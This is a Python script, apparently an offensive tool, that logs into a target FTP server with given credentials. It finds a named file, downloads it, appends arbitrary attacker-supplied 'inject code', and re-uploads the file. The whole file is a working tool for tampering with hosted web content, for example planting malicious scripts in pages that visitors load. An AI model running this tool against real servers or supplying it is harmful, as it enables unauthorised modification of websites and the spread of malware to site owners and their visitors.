import ftplib
import optparse
import sys

class FTPWebFileFinder:
    def __init__(self) -> None:
        self.target = self.get_params()[0]
        self.port = self.get_params()[1]
        self.username = self.get_params()[2]
        self.password = self.get_params()[3]
        self.inject = self.get_params()[4]
        self.filename = self.get_params()[5]
        self.ftp  = ftplib.FTP(host=self.target)

    def get_params(self):
        parser = optparse.OptionParser('Usage: ./%s -t target IP address -p port -u username -P passowrd -i inject code -f filename' % sys.argv[0])
        parser.add_option('-t', '--target', dest='target', type='string', help='Specify target IP address')
        parser.add_option('-p', '--port', dest='port', type='int', help='Specify port')
        parser.add_option('-u', '--username', dest='username', type='string', help='Specify username')
        parser.add_option('-P', '--password', dest='password', type='string', help='Specify password')
        parser.add_option('-i', '--inject', dest='inject', type='string', help='Specify inject code')
        parser.add_option('-f', '--filename', dest='filename', type='string', help='Specify filename')
        options, args = parser.parse_args()
        if options.target is None:
            print(parser.usage)
            sys.exit()

        if options.port is None:
            options.port = 21
   
        if options.username is None or options.password is None:
            print('Specify username or password')
            sys.exit()
        
        if options.inject is None or options.filename is None:
            print('Specify inject code or filename to inject')
            sys.exit()

        return options.target, options.port, options.username, options.password, options.inject,options.filename
    
    def ftp_login(self):
        try:
            
            self.ftp.connect(host=self.target, port=self.port)
            self.ftp.login(user=self.username, passwd=self.password)           
            
        except Exception as e:
            print('[-] Failed to login to target: %s' % e)
            sys.exit()
    
    def list_files(self):
        try:
            dir_list = self.ftp.nlst()
            if len(dir_list)==0:
                return "No files or directories returned"
            return dir_list
        except:
            return "Falied to return files"
    
    def inject_code(self):
        self.ftp_login()
        dir_list = self.list_files()
        if dir_list == "No files or directories returned":
            print("No files or directories returned")
        elif dir_list == "Falied to return files":
            print("Falied to return files")
        else:
            find_flag = False
            
            for item in dir_list:
                if item.strip() == self.filename:
                    print('%s exists, now inject code into it' % self.filename)
                    find_flag = True
                    f = open(self.filename+'.tmp', 'w+')
                    print('Download the file: %s' % self.filename)
                    self.ftp.retrlines('RETR ' + self.filename, f.write)
                    f.write(self.inject)
                    f.close()
                    print("Inject code into the file: %s" % self.filename)
                    self.ftp.storlines('STOR '+ self.filename, open(self.filename+'.tmp','rb'))

if __name__ == '__main__':
    finder = FTPWebFileFinder()
    finder.inject_code()